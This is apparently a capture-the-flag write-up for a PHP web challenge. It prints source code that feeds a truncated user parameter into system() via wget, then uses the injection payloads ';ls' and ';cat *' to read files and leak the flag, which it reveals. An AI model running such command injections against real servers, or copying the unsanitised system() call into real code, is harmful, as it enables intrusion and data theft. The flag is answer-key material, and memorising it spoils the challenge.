This challenge is similar with `random-web1` we leak the source of the page
with the `source` query parameter:

```
<?php

error_reporting(0);
(isset($_GET['source']) AND show_source(__FILE__) AND die()); 

session_start();
$sb = './sb/' . md5(session_id()); #the sandbox
mkdir($sb, 0777, True);
chdir($sb);
    

if(isset($_REQUEST['p'])){
    
    $p = substr($_REQUEST['p'],0,6);
    
    system("wget -qO - " . $p);

}



?>

<!-- /?source -->
```

With the payload `http://34.159.169.171:31255/?source`. We use `p=;ls`
to see what we have in our sandbox. And we see 2 files `flag.php` and
`index.php`. And then we inject our last trigger `p=;cat *` to leak
the flag:

```
<?php

//CTF{fc81554fa89fdbb42a1e05f69bcdf2b4f00b10df}

?><?php

error_reporting(0);
(isset($_GET['source']) AND show_source(__FILE__) AND die()); 

session_start();
$sb = './sb/' . md5(session_id()); #the sandbox
mkdir($sb, 0777, True);
chdir($sb);
	

if(isset($_REQUEST['p'])){
	
	$p = substr($_REQUEST['p'],0,6);
	
	system("wget -qO - " . $p);

}



?>

<!-- /?source -->
<!-- /?source -->
```

The flag was:

```
CTF{fc81554fa89fdbb42a1e05f69bcdf2b4f00b10df}
```
